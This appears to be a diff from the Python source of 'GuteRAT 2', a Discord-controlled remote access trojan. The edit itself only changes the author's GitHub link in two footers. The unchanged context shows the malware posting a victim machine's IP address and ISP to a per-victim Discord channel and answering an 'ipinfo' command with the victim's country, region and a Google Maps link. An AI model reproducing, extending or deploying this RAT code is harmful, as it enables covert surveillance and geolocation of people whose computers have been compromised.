@@ -84,7 +84,7 @@ async def on_ready():
     embed.add_field(name=f"IP Address", value =f"{ip}")
     embed.add_field(name=f"ISP", value =f"{org}", inline=False)
     embed.add_field(name=f"---------------------------------------------------------------------------------", value=f"Type `g!help` for a list of commands!", inline=False)
-    embed.set_footer(text=f"🌟 GuteRAT 2 - Author: Gute Nacht - https://github.com/dacianfan 🌟")
+    embed.set_footer(text=f"🌟 GuteRAT 2 - Author: Gute Nacht - https://github.com/gutenacht0221 🌟")
     channel = discord.utils.get(guild.text_channels, name=f'{login}')
 
     await channel.purge(limit=10000)
@@ -235,7 +235,7 @@ async def ipinfo(ctx):
         embed.add_field(name="Country", value=f"{country}", inline=False)
         embed.add_field(name=f"{RegionOrState}", value=f"{region}", inline=False)
         embed.add_field(name="Google Maps", value=f"{googlemaps}", inline=False)
-        embed.set_footer(text=f"🌟 GuteRAT 2 - Author: Gute Nacht - https://github.com/dacianfan 🌟")
+        embed.set_footer(text=f"🌟 GuteRAT 2 - Author: Gute Nacht - https://github.com/gutenacht0221 🌟")
         await ctx.reply(embed=embed)
     else:
         return
